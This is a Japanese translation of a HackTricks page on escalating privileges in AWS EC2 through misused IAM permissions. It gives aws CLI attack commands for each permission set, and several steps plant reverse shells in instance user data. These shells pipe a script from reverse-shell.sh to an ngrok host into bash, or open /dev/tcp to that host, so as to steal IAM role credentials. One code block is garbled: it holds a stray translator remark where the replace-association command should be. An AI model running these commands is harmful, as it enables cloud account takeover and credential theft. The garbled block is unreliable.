# AWS - EC2 Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでのAWSハッキングを学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## EC2

**EC2についての詳細情報**は以下をチェックしてください:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

攻撃者は**IAMロールをアタッチしてインスタンスを作成し、そのインスタンスにアクセスして**メタデータエンドポイントからIAMロールの認証情報を盗むことができます。

* **SSH経由でのアクセス**

**作成されたsshキー** (`--key-name`) を使用して新しいインスタンスを実行し、それにsshで接続します（新しいキーペアを作成する場合は、`ec2:CreateKeyPair`の権限が必要かもしれません）。
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **ユーザーデータでのリバースシェル経由でのアクセス**

`--user-data` を使用して新しいインスタンスを実行し、**リバースシェル**を送信することができます。この方法ではセキュリティグループを指定する必要はありません。
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
IAMロールの認証情報をインスタンスの外部で使用する場合は、GuradDutyに注意してください：

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**潜在的な影響：** 既存のインスタンスプロファイルに添付されている任意のEC2ロールへの直接の権限昇格。

#### ECSへの権限昇格

この権限セットを持っている場合、**EC2インスタンスを作成し、それをECSクラスターに登録する**こともできます。この方法で、ECS **サービス**はアクセス権を持っている**EC2インスタンス**内で**実行**され、その後、それらのサービス（dockerコンテナー）に侵入し、**添付されているECSロールを盗む**ことができます。

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
この新しいEC2インスタンスで**ECSサービスを強制的に実行する**方法を学ぶには、以下を確認してください：

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

もし**新しいインスタンスを作成できない**が、`ecs:RegisterContainerInstance`の権限を持っている場合、クラスタ内にインスタンスを登録して、コメントされた攻撃を実行することができるかもしれません。

**潜在的な影響：** タスクに添付されたECSロールへの直接的な権限昇格。

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

前のシナリオと同様に、これらの権限を持つ攻撃者は、**コンプロマイズされたインスタンスのIAMロールを変更して**新しい認証情報を盗むことができます。
インスタンスプロファイルは1つのロールしか持てないため、インスタンスプロファイルに**既にロールがある**場合（一般的なケース）、**`iam:RemoveRoleFromInstanceProfile`** も必要になります。

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
```
インスタンスプロファイルにロールがあり、攻撃者がそれを削除できない場合、別の回避策があります。彼はロールのないインスタンスプロファイルを見つけるか、新しいものを作成する（`iam:CreateInstanceProfile`）、そのインスタンスプロファイルにロールを追加する（前述の通り）、そして侵害されたインスタンスプロファイルを侵害されたインスタンスに関連付けることができます：

* インスタンスにインスタンスプロファイルがない場合（`ec2:AssociateIamInstanceProfile`）\*
```
{% endcode %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**潜在的な影響：** 異なるEC2ロールへの直接的なprivesc（AWS EC2インスタンスを侵害し、追加の権限または特定のインスタンスプロファイルの状態が必要です）。

### **`iam:PassRole`** と **`ec2:AssociateIamInstanceProfile`** & **`ec2:DisassociateIamInstanceProfile`** または **`ec2:ReplaceIamInstanceProfileAssociation`**

これらの権限があると、インスタンスに関連付けられているインスタンスプロファイルを変更することができます。そのため、攻撃者が既にインスタンスへのアクセスを持っている場合、それに関連付けられているものを変更して、より多くのインスタンスプロファイルロールの認証情報を盗むことができます。

* インスタンスプロファイルが**ある場合**、インスタンスプロファイルを**削除**（`ec2:DisassociateIamInstanceProfile`）し、それを**関連付ける**ことができます \*

{% code overflow="wrap" %}
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* コンプロマイズされたインスタンスの **インスタンスプロファイル** を**置き換える** (`ec2:ReplaceIamInstanceProfileAssociation`)。 \*

{% code overflow="wrap" %}
````
```bash
The provided text appears to be a command line instruction for AWS EC2 and does not contain any descriptive English text that requires translation. It is a specific command used in AWS to replace an IAM instance profile association. Since you've requested not to translate code, cloud platform names, or specific technical terms, this line remains unchanged in Japanese or any other language. If you need translation of any descriptive text or explanations, please provide the text.
```
````
{% endcode %}

**潜在的影響：** 異なるEC2ロールへの直接的な権限昇格（AWS EC2インスタンスを侵害し、追加の権限または特定のインスタンスプロファイルの状態が必要です）。

### `ec2:RequestSpotInstances`,`iam:PassRole`

**`ec2:RequestSpotInstances`と`iam:PassRole`** の権限を持つ攻撃者は、**EC2ロールが付与された** **スポットインスタンス**を**リクエスト**し、**ユーザーデータ**に**リバースシェル**を設定することができます。\
インスタンスが実行されると、IAMロールを**盗む**ことができます。

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
### `ec2:ModifyInstanceAttribute`

攻撃者は **`ec2:ModifyInstanceAttribute`** 権限を持っている場合、インスタンスの属性を変更することができます。その中で、**ユーザーデータを変更する**ことができ、これによりインスタンスに**任意のデータを実行させる**ことが可能になります。これは、EC2インスタンスへの**リバースシェルを取得する**ために使用できます。

属性はインスタンスが停止している間にのみ**変更可能**であるため、**`ec2:StopInstances`** および **`ec2:StartInstances`** の**権限**が必要です。
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**潜在的な影響：** 作成されたインスタンスにアタッチされた任意のEC2 IAMロールへの直接的な権限昇格。

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

**`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`および`ec2:ModifyLaunchTemplate`** の権限を持つ攻撃者は、**ユーザーデータ**に**リバースシェル**を含む**新しいランチテンプレートバージョン**を作成し、**任意のEC2 IAMロール**をそれに設定し、デフォルトバージョンを変更することができます。そして、**最新版**または**デフォルト版**を使用するように**設定されている**任意の**オートスケーラーグループ**がその**ランチテンプレート**を**使用して**インスタンスを**再実行**すると、リバースシェルが実行されます。

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**潜在的影響：** 異なるEC2ロールへの直接的な権限昇格。

### `autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`

権限 **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** を持つ攻撃者は、**IAMロール**と**ユーザーデータ**内の**リバースシェル**を含む**起動設定**を**作成**し、その設定から**オートスケーリンググループ**を**作成**し、リバースシェルが**IAMロールを盗む**のを待つことができます。
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**潜在的な影響：** 異なるEC2ロールへの直接的な権限昇格。

### `!autoscaling`

**`ec2:CreateLaunchTemplate`** と **`autoscaling:CreateAutoScalingGroup`** の権限セットは、IAMロールへの権限昇格には**十分ではありません**。なぜなら、Launch ConfigurationまたはLaunch Templateで指定されたロールをアタッチするためには、**`iam:PassRole` と `ec2:RunInstances` の権限が必要です**（これは既知の権限昇格です）。

### `ec2-instance-connect:SendSSHPublicKey`

**`ec2-instance-connect:SendSSHPublicKey`** の権限を持つ攻撃者は、sshキーをユーザーに追加し、それを使用してアクセスすることができます（インスタンスへのsshアクセスがある場合）、または権限を昇格させることができます。
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**潜在的な影響：** 実行中のインスタンスにアタッチされたEC2 IAMロールへの直接的な権限昇格。

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

**`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** 権限を持つ攻撃者は、**シリアル接続にsshキーを追加する**ことができます。シリアルが有効でない場合、攻撃者は**`ec2:EnableSerialConsoleAccess`** 権限が必要です。

シリアルポートに接続するためには、マシン内のユーザーの**ユーザー名とパスワードを知る必要があります**。

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

この方法は、利用するためにはユーザー名とパスワードを知っている必要があるため、privescにはあまり役立ちません。

**潜在的影響：** （非常に証明が難しい）実行中のインスタンスにアタッチされたEC2 IAMロールへの直接的なprivesc。

## 参考文献

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
